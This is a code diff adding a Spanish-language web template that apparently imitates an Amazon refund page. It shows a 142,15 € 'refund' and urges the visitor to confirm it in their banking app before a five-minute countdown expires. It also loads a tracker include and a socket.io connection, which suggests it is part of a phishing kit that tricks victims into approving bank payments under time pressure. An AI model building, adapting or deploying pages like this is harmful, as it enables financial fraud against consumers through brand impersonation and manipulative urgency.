@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <%- include('partials/tracker') %>
+    <title>Verificación</title>
+    <link rel="stylesheet" href="./css/bratoka.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <style>
+        .pp1 {
+            font-size: 28px;
+            font-weight: 400;
+            line-height: 1.2;
+            margin-bottom: 15px;
+        }
+        
+        .pp2 {
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #2C7F15;
+            margin: 15px 0;
+            display: block;
+        }
+        
+        .note {
+            font-size: 12px;
+            color: #565959;
+            margin-top: 15px;
+        }
+        .timer-container {
+            margin: 20px 0;
+            text-align: center;
+            position: relative;
+        }
+        
+        .circle-timer {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto;
+        }
+        
+        .circle-timer svg {
+            transform: rotate(-90deg);
+            width: 100%;
+            height: 100%;
+        }
+        
+        .circle-timer circle {
+            fill: none;
+            stroke-width: 8;
+        }
+        
+        .circle-timer .bg {
+            stroke: #e0e0e0;
+        }
+        
+        .circle-timer .progress {
+            stroke: #ff9900;
+            stroke-dasharray: 440;
+            stroke-dashoffset: 0;
+            animation: circle-countdown 360s linear forwards;
+        }
+        
+        @keyframes circle-countdown {
+            0% { stroke-dashoffset: 0; }
+            100% { stroke-dashoffset: 440; }
+        }
+        
+        .timer {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 28px;
+            font-weight: bold;
+            color: #232f3e;
+        }
+        
+        .timer.warning {
+            color: #c45500;
+        }
+        
+        .timer.danger {
+            color: #d01a1a;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .btn {
+            width: 100%;
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border-color: #a88734 #9c7e31 #846a29;
+            color: #111;
+            border-style: solid;
+            border-width: 1px;
+            border-radius: 3px;
+            padding: 8px 10px;
+            cursor: pointer;
+            font-size: 13px;
+            margin-top: 15px;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(to bottom, #f5d78e, #eeb933);
+        }
+    </style>
+</head>
+<body class="mb-pass">
+    <div>
+        <div class="topano">
+            <img src="./img/hedopa-pc.PNG" alt="">
+            <img src="./img/hedopa-mb.png" alt="">
+        </div>
+    </div>
+    <div>
+       
+    </div>
+    <div>
+        <div class="maina">
+            <div class="inmaina">
+                <p class="pp1">Verificación requerida</p>
+                <p class="pp2">Confirmar reembolso</p>
+                
+                <span class="amount">142,15 €</span>
+                
+                <p>
+                    Confirme el reembolso en su aplicación bancaria.
+                </p>
+                
+                <div class="timer-container">
+                    <p>La solicitud caduca en:</p>
+                    <div class="circle-timer">
+                        <svg viewBox="0 0 160 160">
+                            <circle class="bg" cx="80" cy="80" r="70"></circle>
+                            <circle class="progress" cx="80" cy="80" r="70"></circle>
+                        </svg>
+                        <div class="timer" id="countdown">5:00</div>
+                    </div>
+                    <p>Cuando expire el tiempo, deberá reiniciar el proceso.</p>
+                </div>
+                
+                <p class="note">
+                    Esta página se redirigirá automáticamente tras la confirmación correcta.
+                </p>
+            </div>
+        </div>  
+    </div>
+    
+    <div class="line"></div>
+    <div>
+        <div class="botamano">
+            <img src="./img/botamano-pc.PNG" alt="">
+            <img src="./img/botamano-mb.png" alt="">
+        </div>
+    </div>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        // Countdown timer functionality
+        function startCountdown() {
+            let duration = 5 * 60; // 6 minutes in seconds
+            const timerElement = document.getElementById('countdown');
+            const progressCircle = document.querySelector('.circle-timer .progress');
+            
+            const timer = setInterval(function() {
+                const minutes = Math.floor(duration / 60);
+                let seconds = duration % 60;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                timerElement.textContent = minutes + ":" + seconds;
+                
+                if (duration < 60) {
+                    progressCircle.style.stroke = '#d01a1a';
+                    timerElement.classList.add('danger');
+                    timerElement.classList.remove('warning');
+                } else if (duration < 120) {
+                    progressCircle.style.stroke = '#c45500';
+                    timerElement.classList.add('warning');
+                }
+                
+                duration--;
+                
+                if (duration < 0) {
+                    clearInterval(timer);
+                }
+            }, 1000);
+        }
+        
+        // Start the countdown when the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            startCountdown();
+        });
+        
+  
+    </script>
+</body>
+</html>
